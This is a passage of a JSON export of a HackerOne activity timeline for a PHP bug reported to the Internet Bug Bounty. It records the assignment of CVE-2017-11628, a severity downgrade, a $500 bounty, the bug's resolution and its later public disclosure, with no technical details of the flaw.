class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-26T02:54:35.833Z","updated_at":"2017-07-26T02:54:35.833Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1944474,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-21T19:28:52.379Z","updated_at":"2017-08-21T19:28:52.379Z","cve_ids":["CVE-2017-11628"],"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1944477,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-21T19:30:06.458Z","updated_at":"2017-08-21T19:30:06.458Z","additional_data":{"old_severity":"High (8.8)","new_severity":"Medium (6.8)","old_severity_id":58161,"new_severity_id":69684},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1944478,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-21T19:30:27.210Z","updated_at":"2017-08-21T19:30:27.210Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"xixabangm4","url":"/xixabangm4"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1944479,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-21T19:30:33.552Z","updated_at":"2017-08-21T19:30:33.552Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"xixabangm4","url":"/xixabangm4"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025856,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:19:05.933Z","updated_at":"2019-10-13T09:19:05.933Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6029461,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-14T04:35:44.981Z","updated_at":"2019-10-14T04:35:44.981Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6029462,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-14T04:35:45.048Z","updated_at":"2019-10-14T04:35:45.048Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}